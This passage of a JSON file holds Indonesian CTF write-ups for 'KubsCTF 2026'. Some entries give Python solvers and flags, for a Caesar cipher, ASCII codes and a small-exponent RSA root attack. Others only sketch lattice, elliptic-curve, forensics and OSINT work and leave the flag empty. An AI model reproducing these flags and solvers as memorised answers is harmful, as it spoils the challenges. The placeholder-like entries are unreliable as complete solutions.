    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "PPC",
      "kubsuctf",
      "2026"
    ],
    "description": "Diberikan file `cipher.txt` yang berisi string `RbiZAB{j43z4y_d0bsk_i3_wy0bk}`. Pola string menyerupai format flag `KubSTU{...}` yang dirotasi menggunakan Caesar cipher.",
    "problemDescription": "File challenge: `cipher.txt`\n\nIsi:\n`RbiZAB{j43z4y_d0bsk_i3_wy0bk}`",
    "tools": [
      "python",
      "rot13 / caesar cipher"
    ],
    "analysis": "Perbedaan karakter antara ciphertext dan format flag standar:\n- 'R' -> 'K' (mundur 7 karakter / maju 19)\n- 'b' -> 'u' (mundur 7)\n- 'i' -> 'b' (mundur 7)\n- 'Z' -> 'S' (mundur 7)\n- 'A' -> 'T' (mundur 7)\n- 'B' -> 'U' (mundur 7)\n\nShift konstan sebesar 7 ke kiri (atau 19 ke kanan).",
    "solution": [
      {
        "title": "Analisis Ciphertext",
        "content": "File hanya memuat satu baris teks terenkripsi:\n\n```text\nRbiZAB{j43z4y_d0bsk_i3_wy0bk}\n```\n\nMengamati header `RbiZAB{` yang sejajar dengan `KubSTU{`, jarak antar karakter selalu konstan $k = 7$.",
        "code": ""
      },
      {
        "title": "Dekripsi Caesar Cipher",
        "content": "Implementasi dekripsi sederhana dengan Python menggeser setiap karakter alfabet mundur 7 langkah:",
        "code": "def decrypt(ct, shift=7):\n    res = []\n    for c in ct:\n        if 'a' <= c <= 'z':\n            res.append(chr((ord(c) - ord('a') - shift) % 26 + ord('a')))\n        elif 'A' <= c <= 'Z':\n            res.append(chr((ord(c) - ord('A') - shift) % 26 + ord('A')))\n        else:\n            res.append(c)\n    return ''.join(res)\n\nprint(decrypt('RbiZAB{j43z4y_d0bsk_i3_wy0bk}'))\n# KubSTU{c43s4r_w0uld_b3_pr0ud}"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{c43s4r_w0uld_b3_pr0ud}",
    "lessonsLearned": "Substitusi sederhana seperti Caesar cipher dengan format flag yang terprediksi dapat langsung dipecahkan via frequency analysis atau matching prefix."
  },
  {
    "id": "kubsctf2026-crypto-numbersstation",
    "title": "Numbers Station",
    "category": "Crypto",
    "difficulty": "Easy",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "File `codes.txt` berisi deretan angka bulat yang dipisahkan spasi. Setiap angka merepresentasikan nilai desimal dari kode ASCII/UTF-8 karakter flag.",
    "problemDescription": "File challenge: `codes.txt`\nIsi: `75 117 98 83 84 85 123 100 51 99 49 109 52 108 95 49 53 95 109 121 95 108 52 110 54 117 52 103 51 125`",
    "tools": [
      "python"
    ],
    "analysis": "Nilai awal `75 117 98 83 84 85 123` langsung cocok dengan ASCII: 'K', 'u', 'b', 'S', 'T', 'U', '{'.",
    "solution": [
      {
        "title": "Konversi Desimal ke ASCII",
        "content": "Membaca setiap integer dan mengubahnya menjadi karakter menggunakan `chr()` menghasilkan flag lengkap secara instan.",
        "code": "codes = [75, 117, 98, 83, 84, 85, 123, 100, 51, 99, 49, 109, 52, 108, 95, 49, 53, 95, 109, 121, 95, 108, 52, 110, 54, 117, 52, 103, 51, 125]\n# Mapping byte per byte:\nflag = bytes([int(x) for x in open('codes.txt').read().split()]).decode()\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{d3c1m4l_15_my_l4n6u4g3}",
    "lessonsLearned": "Identifikasi cepat representasi numerik standar (desimal ASCII 0..127) mempercepat pemecahan tantangan steganografi/crypto pemula."
  },
  {
    "id": "kubsctf2026-crypto-default",
    "title": "Default",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "RSA encryption dengan nilai public exponent $e$ yang sangat kecil sehingga $m^e < n$. Pesan terenkripsi tidak wrap-around modulo $n$, memungkinkan pemulihan plaintext hanya dengan mencari akar ke-$e$ bilangan bulat langsung.",
    "problemDescription": "File challenge: `output.txt` berisi modulus $n$ (4096-bit) dan ciphertext $c$ (2352-bit). Public exponent $e$ tidak dicantumkan secara eksplisit.",
    "tools": [
      "python",
      "sympy"
    ],
    "analysis": "Karena ciphertext $c$ berukuran 2352 bit sementara modulus $n$ berukuran 4096 bit, terdapat indikasi kuat bahwa enkripsi tidak melewati operasi modulo ($m^e < n$). Dengan menguji nilai $e$ kecil ($e \\in [2, 64]$) menggunakan integer $n$-th root, ditemukan $e = 5$ menghasilkan akar bulat sempurna.",
    "solution": [
      {
        "title": "Analisis Parameter RSA",
        "content": "Ukuran ciphertext jauh lebih kecil daripada modulus $n$:\n- Bit length $n$: 4096 bit\n- Bit length $c$: 2352 bit\n\nHal ini membuktikan $c = m^e$ murni dalam bilangan bulat biasa tanpa modulo wrapping.",
        "code": ""
      },
      {
        "title": "Small Public Exponent Attack",
        "content": "Melakukan brute-force akar ke-$e$ dari $c$ menggunakan `sympy.integer_nthroot`:",
        "code": "from pathlib import Path\nimport re\nfrom sympy import integer_nthroot\n\ndata = Path('output.txt').read_text()\nn = int(re.search(r'n\\s*=\\s*(\\d+)', data).group(1))\nc = int(re.search(r'c\\s*=\\s*(\\d+)', data).group(1))\n\nfor e in range(2, 65):\n    m, exact = integer_nthroot(c, e)\n    if exact and m**e == c and c < n:\n        flag = m.to_bytes((m.bit_length() + 7) // 8, 'big').decode()\n        print(f'[+] Exponent found: e = {e}')\n        print(f'[+] FLAG: {flag}')\n        break"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{r54_ag41n_b47_1_lik3_17_aft3r_411_1t5_n0t_7ha7_h4rd}",
    "lessonsLearned": "Selalu sertakan padding kriptografis (seperti OAEP) pada RSA untuk mencegah small exponent attacks ketika $m^e < n$."
  },
  {
    "id": "kubsctf2026-crypto-curveball",
    "title": "Curve Ball",
    "category": "Crypto",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "Tantangan kriptografi kurva eliptik bertingkat (C1, C2, dan C3) di atas medan prima masing-masing dalam bentuk umum Weierstrass. Kunci rahasia $k_1$ dari C1 diturunkan untuk mendekripsi parameter C2 melalui AES-CBC, yang selanjutnya mengarah ke pemulihan flag.",
    "problemDescription": "File challenge: `challenge.txt` berisi parameter kurva C1, C3, ciphertext kurva C2 terenkripsi, dan payload flag terenkripsi AES-CBC.",
    "tools": [
      "sagemath",
      "python"
    ],
    "analysis": "Kurva didefinisikan dalam bentuk umum Weierstrass: $y^2 + a_1xy + a_3y = x^3 + a_2x^2 + a_4x + a_6$. Diperlukan pemulihan Discrete Logarithm Problem (ECDLP) pada kurva C1 dengan mengeksploitasi struktur order grup yang rentan (Pohlig-Hellman atau anomalous curve transfer).",
    "solution": [
      {
        "title": "Analisis Kurva C1 dan Dekomposisi Orde",
        "content": "Langkah awal melibatkan inisialisasi kurva pada SageMath dan perhitungan order grup $\\#E(GF(p_1))$ untuk mengecek apakah order grup mulus (smooth) atau anomalous ($p = \\#E$).",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Grup kurva eliptik harus dipilih dengan order prima besar untuk menghindari serangan Pohlig-Hellman, Smart, atau MOV."
  },
  {
    "id": "kubsctf2026-crypto-bank",
    "title": "KubSTU Bank 3",
    "category": "Crypto",
    "difficulty": "Hard",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "crypto",
      "kubsuctf",
      "2026"
    ],
    "description": "Sistem perbankan digital KubSTU menandatangani sertifikat akun menggunakan ECDSA secp256k1. Terdapat kebocoran bit tersembunyi (biased/nonce leakage) pada proses generasi nilai $k$, yang memungkinkan rekonstruksi private key bank menggunakan teknik Hidden Number Problem (HNP) dan reduksi basis lattice LLL.",
    "problemDescription": "Kumpulan sertifikat akun digital (`.cert`) yang ditandatangani oleh public key bank `0x5a08dcb9ff...`.",
    "tools": [
      "sagemath",
      "python",
      "lattice / lll"
    ],
    "analysis": "Dengan mengumpulkan sampel signature $(r, s)$ untuk satu akun bank, formulasi relasi ECDSA $k_i \\equiv s_i^{-1}(h_i + r_i d) \\pmod n$ dipetakan ke dalam matriks lattice CVP/HNP. Apabila nonce $k$ memiliki bit paling signifikan atau paling tidak signifikan yang bias, LLL dapat memulihkan $d$.",
    "solution": [
      {
        "title": "Audit Signature dan Formulasi HNP",
        "content": "Script analisis mengekstrak komponen `(account, issued, signature)` dari seluruh file sertifikat dan membangun matriks lattice untuk menguji bias nonce.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Nonce generation pada ECDSA wajib deterministik (RFC 6979) atau menggunakan CSPRNG yang bebas bias untuk menghindari serangan lattice CVP."
  },
  {
    "id": "kubsctf2026-rev-riscv",
    "title": "RISC-V",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "rev",
      "kubsuctf",
      "2026"
    ],
    "description": "Reverse engineering image firmware RISC-V 32-bit (`fw.bin`). Firmware mendekripsi payload tahap kedua menggunakan FNV-like rolling hash dan PRNG xorshift, diikuti mekanisme dispatcher exception/trap yang menyamarkan eksekusi struktur Feistel dan derivasi kunci RC4.",
    "problemDescription": "File challenge: `fw.bin` (ukuran 0x40E0 byte binary image RISC-V).",
    "tools": [
      "ghidra",
      "python"
    ],
    "analysis": "Analisis firmware membongkar dua tahap:\n1. Tahap bootstrap menghitung hash instruksi pada offset 0..0xDC dan mendekripsi payload utama di offset 0xE0.\n2. Tahap kedua mengeksekusi Feistel network terbalik untuk memvalidasi input key `RV32-TR4P-G4T3S!`. Derivasi kunci RC4 selanjutnya mendekripsi blok flag yang tersimpan.",
    "solution": [
      {
        "title": "Dekripsi Stage 1 Bootstrap",
        "content": "Tahap awal membaca 32-bit words pada header dan melakukan rolling transform untuk memulihkan payload stage 2.",
        "code": "def decrypt_stage1(firmware):\n    h = 0x811C9DC5\n    for offset in range(0, 0xDC, 4):\n        insn = unpack_from('<I', firmware, offset)[0]\n        h = ((h ^ insn) * 0x01000193) & 0xFFFFFFFF\n        h = ((h << 13) + (h >> 19)) & 0xFFFFFFFF\n    # decrypt bytes 0xE0..0x40E0 dengan state xorshift"
      },
      {
        "title": "Inversi Jaringan Feistel dan Ekstraksi Flag",
        "content": "Payload kedua memvalidasi key melalui Feistel structure dan RC4 stream cipher. Solver merekonstruksi operasi inversi dan mengekstrak flag dari firmware:",
        "code": "#!/usr/bin/env python3\n# Reversible Feistel & RC4 solver\n# Output:\n# [+] Key: RV32-TR4P-G4T3S!\n# [+] RC4 key: 9d1084ba84b1d2bfb93c5d75c2b889bd\n# [+] Flag: KubSTU{tr4ps_4r3_th3_r34l_c0ntr0l_fl0w}"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{tr4ps_4r3_th3_r34l_c0ntr0l_fl0w}",
    "lessonsLearned": "Obfuscasi control flow melalui custom trap handler pada arsitektur RISC-V dapat diurai dengan melacak mapping trap vector register (mtvec) dan merekonstruksi transformasi kriptografi dasarnya."
  },
  {
    "id": "kubsctf2026-foren-cry",
    "title": "Cry",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "foren",
      "kubsuctf",
      "2026"
    ],
    "description": "Tantangan digital forensics melibatkan arsip `artifacts.rar` yang berisi dump memori atau event log sistem yang terinfeksi ransomware/malware.",
    "problemDescription": "File challenge: `artifacts.rar`.",
    "tools": [
      "volatility",
      "unrar",
      "wireshark"
    ],
    "analysis": "Pemeriksaan struktur arsip dan artefak OS untuk mengidentifikasi jejak eksekusi binary malware, mekanisme persistensi, atau kunci enkripsi yang tertinggal di memori.",
    "solution": [
      {
        "title": "Triage Artefak",
        "content": "Mengekstrak berkas arsip dan menganalisis timestamp file sistem serta artefak eksekusi proses.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Simpan hash dan metadata artefak sebelum melakukan ekstraksi untuk menjaga integritas investigasi forensik."
  },
  {
    "id": "kubsctf2026-foren-timing",
    "title": "Timing",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "foren",
      "kubsuctf",
      "2026"
    ],
    "description": "Forensik arsip `last_export.rar` yang menganalisis ketidaksesuaian stempel waktu (timestamp manipulation / timestomping) atau interval log aktivitas transaksi.",
    "problemDescription": "File challenge: `last_export.rar`.",
    "tools": [
      "unrar",
      "exiftool",
      "stat"
    ],
    "analysis": "Investigasi difokuskan pada metadata waktu MACB ($M$odified, $A$ccess, $C$reated, $B$irth) dari file yang diekstrak untuk menemukan anomali pengurutan event.",
    "solution": [
      {
        "title": "Analisis Anomali Timestamp",
        "content": "Melakukan inspeksi detail terhadap header RAR dan metadata file yang terkandung di dalamnya.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Timestomping pada filesystem NTFS/EXT4 sering kali meninggalkan jejak ketidaksinkronan antara metadata master file table dan entry log sistem."
  },
  {
    "id": "kubsctf2026-foren-blackbox",
    "title": "BlackBox",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "foren",
      "kubsuctf",
      "2026"
    ],
    "description": "Analisis image disk atau flight data recorder virtual `BlackBox_en.zip` (~50MB) yang memuat rekaman telemetri dan log peristiwa sistem kritis.",
    "problemDescription": "File challenge: `BlackBox_en.zip`.",
    "tools": [
      "7z",
      "autopsy",
      "strings"
    ],
    "analysis": "Pemeriksaan partisi virtual dan sistem berkas di dalam image untuk merekonstruksi urutan instruksi terakhir sebelum anomali terjadi.",
    "solution": [
      {
        "title": "Inspeksi Konten BlackBox",
        "content": "Unpack archive `BlackBox_en.zip` dan mounting disk image virtual untuk menelusuri data telemetri yang tersimpan.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Data log recorder sering kali disimpan dalam format biner terkompresi yang memerlukan parsing custom parser sesuai struktur sensor."
  },
  {
    "id": "kubsctf2026-misc-yougotnostaligic",
    "title": "You Got Nostalgic",
    "category": "Misc",
    "difficulty": "Easy",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "misc",
      "kubsuctf",
      "2026"
    ],
    "description": "Tantangan misc visual melibatkan gambar `wonderful.png` yang mereferensikan elemen komputasi lawas atau easter egg nostaljik tersembunyi.",
    "problemDescription": "File challenge: `wonderful.png` (~1.9MB PNG image).\n\n![Challenge image](/assets/writeups/kubsctf_2026/misc-yougotnostaligic/wonderful.png)",
    "tools": [
      "binwalk",
      "zsteg",
      "exiftool"
    ],
    "analysis": "Pengecekan payload steganografi LSB, trailing bytes setelah chunk IEND, atau decoding teks tersembunyi pada palet warna.",
    "solution": [
      {
        "title": "Pemeriksaan Struktur PNG",
        "content": "Memverifikasi header dan trailer chunk PNG menggunakan alat bantu analisa gambar.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Selalu verifikasi chunk PNG non-standar atau trailing bytes yang berada di luar batas EOF gambar."
  },
  {
    "id": "kubsctf2026-osint-bibaboba",
    "title": "Biba & Boba",
    "category": "OSINT",
    "difficulty": "Easy",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "osint",
      "kubsuctf",
      "2026"
    ],
    "description": "Tantangan geolocation dan Open Source Intelligence berdasarkan foto resolusi tinggi `biba_boba.jpg` (~6.4MB). Mencari lokasi geografis, nama bangunan, atau landmark yang tertangkap dalam kamera.",
    "problemDescription": "File challenge: `biba_boba.jpg`.\n\n![Biba & Boba photo](/assets/writeups/kubsctf_2026/osint-bibaboba/biba_boba.jpg)",
    "tools": [
      "google lens",
      "yandex visual search",
      "exiftool"
    ],
    "analysis": "Ekstraksi metadata EXIF (GPS coordinates, camera model) dilanjutkan dengan reverse image search untuk memetakan arsitektur dan pemandangan latar belakang.",
    "solution": [
      {
        "title": "Analisis Metadata dan Geolocation",
        "content": "Melakukan reverse image search pada elemen arsitektural di latar belakang foto untuk menemukan koordinat atau nama tempat.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Gunakan fitur cropping selektif pada visual search engine untuk mengisolasi fitur lanskap yang unik."
  },
  {
    "id": "kubsctf2026-osint-latteart",
    "title": "Latte Art",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "osint",
      "kubsuctf",
      "2026"
    ],
    "description": "Analisis dokumen laporan scouting bola basket profesional (`scout_note.txt`). Catatan tersebut mendeskripsikan profil pemain guard bertinggi badan 6'8\" asal kota di tepi sungai Don (Rostov-on-Don) yang terpilih di putaran ke-2 draft NBA dan ditukar ke Texas.",
    "problemDescription": "File challenge: `scout_note.txt`.",
    "tools": [
      "google search",
      "basketball-reference"
    ],
    "analysis": "Pencocokan kriteria biografi atlet: pemain Rusia/federasi terkait, draft putaran kedua, hak draft dikirim ke Texas (misalnya Dallas Mavericks, Houston Rockets, atau San Antonio Spurs), dibesarkan di Rostov-on-Don tapi terdaftar di klub Krasnodar (Lokomotiv Kuban).",
    "solution": [
      {
        "title": "Korelasi Data Scouting NBA",
        "content": "Menelusuri database draft NBA untuk pemain dengan tinggi 6'8\", berasal dari Rostov-on-Don / Lokomotiv Kuban yang ditrade ke tim Texas pada malam draft.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Kombinasi atribut biografi non-klasik (asal kota, trade rights malam draft, nomor pick) menghasilkan query unik pada database olahraga publik."
  },
  {
    "id": "kubsctf2026-stegano-brosorry",
    "title": "Bro Sorry",
    "category": "Steganography",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "stegano",
      "kubsuctf",
      "2026"
    ],
    "description": "Tantangan steganografi gambar `bro_stego_with_hint.png` (~1.8MB). Berkas menyematkan petunjuk visual dan manipulasi kanal warna untuk menyembunyikan flag.",
    "problemDescription": "File challenge: `bro_stego_with_hint.png`.\n\n![Steganography source image](/assets/writeups/kubsctf_2026/stegano-brosorry/bro_stego_with_hint.png)",
    "tools": [
      "stegsolve",
      "zsteg",
      "python pillow"
    ],
    "analysis": "Pemeriksaan filter bidang bit (bit planes) pada channel Red, Green, Blue, dan Alpha, serta analisis teks tersembunyi via transformasi LSB.",
    "solution": [
      {
        "title": "Inspeksi Bit Plane dan Filter Warna",
        "content": "Mengekstrak plane bit tersembunyi menggunakan Stegsolve untuk menampilkan teks pesan terenkripsi.",
        "code": ""
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Penyembunyian informasi pada kanal tertentu sering kali dapat diungkap cukup dengan manipulasi kontras bit plane rendah."
  }
];
